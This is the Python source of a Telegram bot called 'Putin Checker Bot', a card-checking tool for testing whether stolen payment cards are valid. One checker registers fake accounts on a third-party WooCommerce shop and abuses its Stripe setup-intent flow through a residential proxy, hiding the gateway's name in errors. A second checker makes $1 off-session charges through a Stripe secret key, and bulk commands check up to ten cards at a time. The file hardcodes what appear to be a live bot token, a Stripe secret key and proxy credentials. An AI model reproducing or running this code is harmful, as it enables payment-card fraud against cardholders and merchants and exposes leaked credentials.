import asyncio
import logging
import re
import random
from datetime import datetime, timedelta
from typing import Optional, Tuple, Dict, List
from dataclasses import dataclass
from contextlib import asynccontextmanager

import aiohttp
from bs4 import BeautifulSoup
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.formatting import Text, Bold, Code

# ==================== CONFIGURATION ====================
# ВАЖНО: Используйте переменные окружения для продакшена!
# export BOT_TOKEN="your_token"
# export STRIPE_API_KEY="your_key"
# export ADMIN_CHAT_ID="your_id"

import os

BOT_TOKEN = os.getenv("BOT_TOKEN", "8387409133:AAF4S-pNFd_Jcgcb8yxwjoXhCHfQavMjj4M")
STRIPE_API_KEY = os.getenv("STRIPE_API_KEY", "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")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "8014397974")
PROXY_STR = os.getenv("PROXY_STR", "proxy.geonode.io:9000:geonode_8jyRQvRui6-type-residential:305649b7-1a2d-4c8f-8a3a-6505059428ba")

# Rate limiting
CHK_COOLDOWN = 5  # seconds
MASS_COOLDOWN = 20  # seconds
MAX_MASS_CARDS = 10

# Timeouts
REQUEST_TIMEOUT = 15
PROXY_TEST_TIMEOUT = 5

# ==================== LOGGING ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== DATA CLASSES ====================
@dataclass
class CardData:
    cc: str
    mm: str
    yy: str
    cvv: str
    
    def __str__(self):
        return f"{self.cc}|{self.mm}|{self.yy}|{self.cvv}"
    
    @property
    def full_year(self):
        return f"20{self.yy}" if len(self.yy) == 2 else self.yy

@dataclass
class CheckResult:
    status: str  # approved, declined, error
    card: str
    message: str
    extra_info: Optional[str] = None
    
    def format(self) -> str:
        emoji_map = {
            "approved": ("✅", "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"),
            "declined": ("❌", "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"),
            "error": ("⚠️", "𝗘𝗥𝗥𝗢𝗥")
        }
        emoji, status_text = emoji_map.get(self.status, ("ℹ️", "𝗜𝗡𝗙𝗢"))
        
        result = (
            f"{emoji} <b>{status_text}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"<code>{self.card}</code>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"<b>Response:</b> {self.message}\n"
        )
        if self.extra_info:
            result += f"<b>Info:</b> {self.extra_info}\n"
        result += "━━━━━━━━━━━━━━━"
        return result

# ==================== RATE LIMITER ====================
class RateLimiter:
    def __init__(self):
        self.last_chk: Dict[int, datetime] = {}
        self.last_mass: Dict[int, datetime] = {}
    
    def check_chk(self, user_id: int) -> Optional[float]:
        """Returns remaining cooldown time or None if allowed"""
        if user_id in self.last_chk:
            elapsed = (datetime.now() - self.last_chk[user_id]).total_seconds()
            if elapsed < CHK_COOLDOWN:
                return CHK_COOLDOWN - elapsed
        self.last_chk[user_id] = datetime.now()
        return None
    
    def check_mass(self, user_id: int) -> Optional[float]:
        """Returns remaining cooldown time or None if allowed"""
        if user_id in self.last_mass:
            elapsed = (datetime.now() - self.last_mass[user_id]).total_seconds()
            if elapsed < MASS_COOLDOWN:
                return MASS_COOLDOWN - elapsed
        self.last_mass[user_id] = datetime.now()
        return None

# ==================== UTILITIES ====================
def luhn_check(card_number: str) -> bool:
    """Validate card number using Luhn algorithm"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

def parse_card_details(card_string: str) -> Optional[CardData]:
    """Parse card details from various formats"""
    card_string = card_string.strip()
    
    # Try standard format: CC|MM|YY|CVV
    match = re.search(r'(\d{13,19})[|/\s-]+(\d{1,2})[|/\s-]+(\d{2}|\d{4})[|/\s-]+(\d{3,4})', card_string)
    if match:
        cc, mm, yy, cvv = match.groups()
    else:
        # Try to extract parts individually
        temp = card_string
        cc_match = re.search(r'\d{13,19}', temp)
        if not cc_match:
            return None
        cc = cc_match.group(0)
        temp = temp.replace(cc, '', 1)
        
        mm_match = re.search(r'(?:MM:|M:)?\s*(\d{1,2})(?!\d)', temp)
        if not mm_match:
            return None
        mm = mm_match.group(1)
        temp = temp.replace(mm_match.group(0), '', 1)
        
        yy_match = re.search(r'(?:YY:|Y:)?\s*(\d{2}|\d{4})(?!\d)', temp)
        if not yy_match:
            return None
        yy = yy_match.group(1)
        temp = temp.replace(yy_match.group(0), '', 1)
        
        cvv_match = re.search(r'(?:CVV:|CVC:)?\s*(\d{3,4})(?!\d)', temp)
        if not cvv_match:
            return None
        cvv = cvv_match.group(1)
    
    # Validate month
    try:
        mm_int = int(mm)
        if not (1 <= mm_int <= 12):
            return None
        mm = str(mm_int).zfill(2)
    except ValueError:
        return None
    
    # Validate year
    try:
        current_year = datetime.now().year
        if len(yy) == 2:
            yy_full = int(f"20{yy}") if int(yy) >= (current_year % 100) else int(f"19{yy}")
        else:
            yy_full = int(yy)
        
        if not (current_year <= yy_full <= current_year + 15):
            return None
        yy = str(yy_full)[-2:]
    except ValueError:
        return None
    
    # Validate Luhn
    if not luhn_check(cc):
        logger.warning(f"Card {cc} failed Luhn check")
        return None
    
    return CardData(cc=cc, mm=mm, yy=yy, cvv=cvv)

def generate_fake_email() -> str:
    """Generate random email"""
    random_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{random_string}@{random.choice(domains)}"

def parse_proxy(proxy_str: str) -> Optional[str]:
    """Parse proxy string to aiohttp format"""
    try:
        parts = proxy_str.split(":")
        if len(parts) == 4:
            host, port, user, passw = parts
            return f"http://{user}:{passw}@{host}:{port}"
        elif len(parts) == 2:
            host, port = parts
            return f"http://{host}:{port}"
    except Exception as e:
        logger.error(f"Proxy parse error: {e}")
    return None

async def test_proxy(proxy_url: str, timeout: int = PROXY_TEST_TIMEOUT) -> bool:
    """Test if proxy is working"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://httpbin.org/ip",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as response:
                return response.status == 200
    except Exception as e:
        logger.debug(f"Proxy test failed: {e}")
        return False

def clean_error_message(error_str: str) -> str:
    """Clean error messages"""
    error_str = str(error_str)
    if "for url:" in error_str.lower():
        error_str = error_str.split("for url:")[0].strip()
    if "https://" in error_str or "http://" in error_str:
        error_str = "Gateway error - please try again"
    return error_str[:200]  # Limit length

# ==================== CARD CHECKERS ====================
class BahamaChecker:
    """Check cards via bahamabos.com gateway"""
    
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.base_url = "https://bahamabos.com"
    
    @asynccontextmanager
    async def get_session(self):
        """Create aiohttp session with proxy"""
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector
        ) as session:
            yield session
    
    async def check_card(self, card: CardData) -> CheckResult:
        """Check card through Bahama gateway"""
        mail = generate_fake_email()
        
        headers = {
            'authority': 'bahamabos.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
        }
        
        try:
            async with self.get_session() as session:
                # Step 1: Get register page and nonce
                async with session.get(
                    f'{self.base_url}/my-account/',
                    headers=headers,
                    proxy=self.proxy
                ) as response:
                    if response.status != 200:
                        raise Exception(f"Failed to load page: {response.status}")
                    
                    html = await response.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    nonce_elem = soup.find(id="woocommerce-register-nonce")
                    
                    if not nonce_elem:
                        raise Exception("Registration nonce not found")
                    
                    nonce_value = nonce_elem.get("value")
                
                # Step 2: Register account
                headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': self.base_url,
                    'referer': f'{self.base_url}/my-account/',
                    'sec-fetch-site': 'same-origin'
                })
                
                register_data = {
                    'email': mail,
                    'woocommerce-register-nonce': nonce_value,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }
                
                async with session.post(
                    f'{self.base_url}/my-account/',
                    headers=headers,
                    data=register_data,
                    proxy=self.proxy
                ) as response:
                    if response.status != 200:
                        raise Exception(f"Registration failed: {response.status}")
                
                # Step 3: Get payment method page
                headers.pop('content-type', None)
                headers['referer'] = f'{self.base_url}/my-account/'
                
                async with session.get(
                    f'{self.base_url}/my-account/add-payment-method/',
                    headers=headers,
                    proxy=self.proxy
                ) as response:
                    if response.status != 200:
                        raise Exception(f"Failed to load payment page: {response.status}")
                    
                    html = await response.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    
                    # Extract AJAX nonce
                    ajax_nonce = None
                    for script in soup.find_all('script'):
                        if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                            match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', script.string)
                            if match:
                                ajax_nonce = match.group(1)
                                break
                    
                    if not ajax_nonce:
                        raise Exception("AJAX nonce not found")
                
                # Step 4: Create Stripe payment method
                stripe_headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': headers['user-agent'],
                }
                
                stripe_data = {
                    "type": "card",
                    "card[number]": card.cc,
                    "card[cvc]": card.cvv,
                    "card[exp_year]": card.yy,
                    "card[exp_month]": card.mm,
                    "allow_redisplay": "unspecified",
                    "billing_details[address][country]": "US",
                    "payment_user_agent": "stripe.js/9a3c9afc22; stripe-js-v3/9a3c9afc22",
                    "referrer": self.base_url,
                    "key": "pk_live_axb2b6B9U2aIqQq93VRd6qF6009oO6P3ds",
                }
                
                async with session.post(
                    'https://api.stripe.com/v1/payment_methods',
                    headers=stripe_headers,
                    data=stripe_data,
                    proxy=self.proxy
                ) as response:
                    if response.status != 200:
                        error_data = await response.json()
                        error_msg = error_data.get("error", {}).get("message", "Unknown error")
                        return CheckResult("declined", str(card), error_msg)
                    
                    pm_data = await response.json()
                    pm_id = pm_data.get("id")
                    
                    if not pm_id:
                        raise Exception("Payment method ID not found")
                
                # Step 5: Confirm setup intent
                final_headers = headers.copy()
                final_headers.update({
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'referer': f'{self.base_url}/my-account/add-payment-method/',
                    'x-requested-with': 'XMLHttpRequest',
                })
                
                final_data = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': pm_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': ajax_nonce,
                }
                
                async with session.post(
                    f'{self.base_url}/wp-admin/admin-ajax.php',
                    headers=final_headers,
                    data=final_data,
                    proxy=self.proxy
                ) as response:
                    if response.status == 403:
                        raise Exception("Access forbidden - gateway blocked request")
                    
                    if response.status != 200:
                        raise Exception(f"Setup intent failed: {response.status}")
                    
                    result = await response.json()
                    
                    if result.get("success"):
                        return CheckResult("approved", str(card), "Card Approved Successfully! ✅")
                    else:
                        error_msg = result.get("data", {}).get("error", {}).get("message", "Unknown error")
                        return CheckResult("declined", str(card), error_msg)
        
        except asyncio.TimeoutError:
            return CheckResult("error", str(card), "Request timeout")
        except Exception as e:
            logger.error(f"Bahama check error: {e}")
            return CheckResult("error", str(card), clean_error_message(str(e)))

class StripeChecker:
    """Check cards directly via Stripe API"""
    
    def __init__(self, api_key: str):
        self.api_key = api_key
    
    async def check_card(self, card: CardData) -> CheckResult:
        """Check card via Stripe API"""
        try:
            async with aiohttp.ClientSession() as session:
                # Create payment method
                pm_data = {
                    "type": "card",
                    "card[number]": card.cc,
                    "card[exp_month]": card.mm,
                    "card[exp_year]": card.full_year,
                    "card[cvc]": card.cvv,
                    "billing_details[name]": "John Doe",
                    "billing_details[email]": generate_fake_email(),
                    "billing_details[address][line1]": "123 Main St",
                    "billing_details[address][city]": "New York",
                    "billing_details[address][state]": "NY",
                    "billing_details[address][postal_code]": "10001",
                    "billing_details[address][country]": "US",
                }
                
                headers = {
                    "Authorization": f"Bearer {self.api_key}",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                
                async with session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers,
                    data=pm_data,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    pm_result = await response.json()
                    
                    if response.status != 200:
                        error_msg = pm_result.get("error", {}).get("message", "Unknown error")
                        decline_code = pm_result.get("error", {}).get("decline_code", "")
                        if decline_code:
                            error_msg += f" ({decline_code})"
                        return CheckResult("declined", str(card), error_msg)
                    
                    pm_id = pm_result.get("id")
                    if not pm_id:
                        return CheckResult("error", str(card), "Failed to create payment method")
                
                # Create payment intent
                pi_data = {
                    "amount": "100",
                    "currency": "usd",
                    "payment_method": pm_id,
                    "confirm": "true",
                    "off_session": "true",
                    "description": "Auth test",
                }
                
                async with session.post(
                    "https://api.stripe.com/v1/payment_intents",
                    headers=headers,
                    data=pi_data,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    pi_result = await response.json()
                    
                    if response.status == 200:
                        status = pi_result.get("status")
                        if status == "succeeded":
                            return CheckResult("approved", str(card), "Card Charged Successfully! ✅")
                        elif status == "requires_payment_method":
                            error = pi_result.get("last_payment_error", {})
                            error_msg = error.get("message", "Payment method required")
                            decline_code = error.get("decline_code", "")
                            if decline_code:
                                error_msg += f" ({decline_code})"
                            return CheckResult("declined", str(card), error_msg)
                        elif status == "requires_action":
                            return CheckResult("declined", str(card), "3D Secure required")
                        else:
                            return CheckResult("declined", str(card), f"Status: {status}")
                    else:
                        error = pi_result.get("error", {})
                        error_msg = error.get("message", "Unknown error")
                        decline_code = error.get("decline_code", "")
                        if decline_code:
                            error_msg += f" ({decline_code})"
                        return CheckResult("declined", str(card), error_msg)
        
        except asyncio.TimeoutError:
            return CheckResult("error", str(card), "Request timeout")
        except Exception as e:
            logger.error(f"Stripe check error: {e}")
            return CheckResult("error", str(card), clean_error_message(str(e)))

# ==================== BOT HANDLERS ====================
# Global instances
rate_limiter = RateLimiter()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

@dp.message(Command("start"))
async def cmd_start(message: Message):
    """Start command handler"""
    welcome_msg = (
        "🤖 <b>Welcome to Putin Checker Bot!</b>\n"
        "━━━━━━━━━━━━━━━\n\n"
        "<b>Commands:</b>\n"
        "• <code>/chk CC|MM|YY|CVV</code> - Check single card\n"
        "• <code>/mass</code> - Check multiple cards (max 10)\n"
        "• <code>/st CC|MM|YY|CVV</code> - Stripe SK check\n"
        "• <code>/mst</code> - Stripe SK mass check\n\n"
        "━━━━━━━━━━━━━━━\n"
        "⚡ <b>Fast • Reliable • Secure</b>\n\n"
        "💡 <b>Tip:</b> Supported formats:\n"
        "<code>4532111111111111|12|25|123</code>\n"
        "<code>4532111111111111/12/25/123</code>\n"
        "<code>4532111111111111 12 25 123</code>"
    )
    await message.answer(welcome_msg, parse_mode='HTML')

@dp.message(Command("chk"))
async def cmd_chk(message: Message):
    """Check single card via Bahama gateway"""
    user_id = message.from_user.id
    
    # Rate limiting
    cooldown = rate_limiter.check_chk(user_id)
    if cooldown:
        await message.answer(
            f"⏳ Please wait <code>{cooldown:.1f}s</code> before next check",
            parse_mode='HTML'
        )
        return
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/chk CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b>\n<code>/chk 4532111111111111|12|25|123</code>",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    card = parse_card_details(card_input)
    
    if not card:
        await message.answer(
            "❌ <b>Invalid card format</b>\n\n"
            "Please use: <code>CC|MM|YY|CVV</code>\n"
            "Example: <code>4532111111111111|12|25|123</code>",
            parse_mode='HTML'
        )
        return
    
    # Send processing message
    status_msg = await message.answer(
        f"🔄 <b>Processing card...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    try:
        # Get proxy
        proxy = None
        if PROXY_STR:
            proxy = parse_proxy(PROXY_STR)
            if proxy and not await test_proxy(proxy):
                logger.warning("Proxy not working, proceeding without proxy")
                proxy = None
        
        # Check card
        checker = BahamaChecker(proxy=proxy)
        result = await checker.check_card(card)
        
        # Delete processing message
        await status_msg.delete()
        
        # Send result (hide gateway name on errors)
        if result.status == "error":
            # Generic error message without mentioning the gateway
            error_msg = result.message
            if "bahamabos" in error_msg.lower() or "gateway" in error_msg.lower():
                error_msg = "Service temporarily unavailable. Please try again."
            
            clean_result = CheckResult(
                status="error",
                card=result.card,
                message=error_msg,
                extra_info=None
            )
            await message.answer(clean_result.format(), parse_mode='HTML')
        else:
            await message.answer(result.format(), parse_mode='HTML')
    
    except Exception as e:
        logger.error(f"Command /chk error: {e}")
        await status_msg.delete()
        await message.answer(
            "❌ <b>An error occurred</b>\n"
            "Please try again later.",
            parse_mode='HTML'
        )

@dp.message(Command("mass"))
async def cmd_mass(message: Message):
    """Check multiple cards via Bahama gateway"""
    user_id = message.from_user.id
    
    # Rate limiting
    cooldown = rate_limiter.check_mass(user_id)
    if cooldown:
        await message.answer(
            f"⏳ Please wait <code>{cooldown:.1f}s</code> before next mass check",
            parse_mode='HTML'
        )
        return
    
    # Parse cards from message
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> Send cards (one per line)\n\n"
            "<b>Example:</b>\n"
            "<code>/mass\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    
    # Parse all cards
    cards_to_check = []
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            card = parse_card_details(line)
            if card:
                cards_to_check.append(card)
    
    if not cards_to_check:
        await message.answer(
            "❌ <b>No valid cards found</b>\n\n"
            "Please check your card format.",
            parse_mode='HTML'
        )
        return
    
    # Limit cards
    if len(cards_to_check) > MAX_MASS_CARDS:
        cards_to_check = cards_to_check[:MAX_MASS_CARDS]
        await message.answer(
            f"⚠️ Limited to {MAX_MASS_CARDS} cards",
            parse_mode='HTML'
        )
    
    # Send start message
    await message.answer(
        f"🚀 <b>Processing {len(cards_to_check)} cards...</b>",
        parse_mode='HTML'
    )
    
    # Get proxy
    proxy = None
    if PROXY_STR:
        proxy = parse_proxy(PROXY_STR)
        if proxy and not await test_proxy(proxy):
            logger.warning("Proxy not working, proceeding without proxy")
            proxy = None
    
    # Check each card
    checker = BahamaChecker(proxy=proxy)
    for idx, card in enumerate(cards_to_check, 1):
        try:
            result = await checker.check_card(card)
            
            # Hide gateway name on errors
            if result.status == "error":
                error_msg = result.message
                if "bahamabos" in error_msg.lower() or "gateway" in error_msg.lower():
                    error_msg = "Service temporarily unavailable"
                
                clean_result = CheckResult(
                    status="error",
                    card=result.card,
                    message=error_msg,
                    extra_info=None
                )
                await message.answer(
                    f"<b>{idx}/{len(cards_to_check)}</b>\n{clean_result.format()}",
                    parse_mode='HTML'
                )
            else:
                await message.answer(
                    f"<b>{idx}/{len(cards_to_check)}</b>\n{result.format()}",
                    parse_mode='HTML'
                )
            
            # Small delay between checks
            if idx < len(cards_to_check):
                await asyncio.sleep(1)
        
        except Exception as e:
            logger.error(f"Mass check error for card {idx}: {e}")
            await message.answer(
                f"<b>{idx}/{len(cards_to_check)}</b>\n"
                "❌ <b>ERROR</b>\n"
                f"<code>{card}</code>\n"
                "Processing failed",
                parse_mode='HTML'
            )
    
    # Send completion message
    await message.answer(
        f"✅ <b>Completed {len(cards_to_check)} cards</b>",
        parse_mode='HTML'
    )

@dp.message(Command("st"))
async def cmd_st(message: Message):
    """Check single card via Stripe API"""
    user_id = message.from_user.id
    
    # Rate limiting
    cooldown = rate_limiter.check_chk(user_id)
    if cooldown:
        await message.answer(
            f"⏳ Please wait <code>{cooldown:.1f}s</code> before next check",
            parse_mode='HTML'
        )
        return
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/st CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b>\n<code>/st 4532111111111111|12|25|123</code>",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    card = parse_card_details(card_input)
    
    if not card:
        await message.answer(
            "❌ <b>Invalid card format</b>\n\n"
            "Please use: <code>CC|MM|YY|CVV</code>",
            parse_mode='HTML'
        )
        return
    
    # Send processing message
    status_msg = await message.answer(
        f"🔄 <b>Stripe checking...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    try:
        checker = StripeChecker(STRIPE_API_KEY)
        result = await checker.check_card(card)
        
        await status_msg.delete()
        await message.answer(result.format(), parse_mode='HTML')
    
    except Exception as e:
        logger.error(f"Command /st error: {e}")
        await status_msg.delete()
        await message.answer(
            "❌ <b>An error occurred</b>\n"
            "Please try again later.",
            parse_mode='HTML'
        )

@dp.message(Command("mst"))
async def cmd_mst(message: Message):
    """Check multiple cards via Stripe API"""
    user_id = message.from_user.id
    
    # Rate limiting
    cooldown = rate_limiter.check_mass(user_id)
    if cooldown:
        await message.answer(
            f"⏳ Please wait <code>{cooldown:.1f}s</code> before next mass check",
            parse_mode='HTML'
        )
        return
    
    # Parse cards
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> Send cards (one per line)\n\n"
            "<b>Example:</b>\n"
            "<code>/mst\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    
    # Parse all cards
    cards_to_check = []
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            card = parse_card_details(line)
            if card:
                cards_to_check.append(card)
    
    if not cards_to_check:
        await message.answer(
            "❌ <b>No valid cards found</b>",
            parse_mode='HTML'
        )
        return
    
    # Limit cards
    if len(cards_to_check) > MAX_MASS_CARDS:
        cards_to_check = cards_to_check[:MAX_MASS_CARDS]
        await message.answer(
            f"⚠️ Limited to {MAX_MASS_CARDS} cards",
            parse_mode='HTML'
        )
    
    # Send start message
    await message.answer(
        f"🚀 <b>Stripe checking {len(cards_to_check)} cards...</b>",
        parse_mode='HTML'
    )
    
    # Check each card
    checker = StripeChecker(STRIPE_API_KEY)
    for idx, card in enumerate(cards_to_check, 1):
        try:
            result = await checker.check_card(card)
            await message.answer(
                f"<b>{idx}/{len(cards_to_check)}</b>\n{result.format()}",
                parse_mode='HTML'
            )
            
            # Small delay
            if idx < len(cards_to_check):
                await asyncio.sleep(1)
        
        except Exception as e:
            logger.error(f"Stripe mass check error for card {idx}: {e}")
            await message.answer(
                f"<b>{idx}/{len(cards_to_check)}</b>\n"
                "❌ <b>ERROR</b>\n"
                f"<code>{card}</code>\n"
                "Processing failed",
                parse_mode='HTML'
            )
    
    # Completion
    await message.answer(
        f"✅ <b>Completed {len(cards_to_check)} cards</b>",
        parse_mode='HTML'
    )

# ==================== MAIN ====================
async def main():
    """Main function to start bot"""
    logger.info("🤖 Bot starting...")
    
    # Test proxy if configured
    if PROXY_STR:
        logger.info("🔄 Testing proxy...")
        proxy = parse_proxy(PROXY_STR)
        if proxy and await test_proxy(proxy):
            logger.info("✅ Proxy is working")
        else:
            logger.warning("⚠️ Proxy not working, will proceed without it")
    
    logger.info("✅ Bot started successfully!")
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Bot stopped")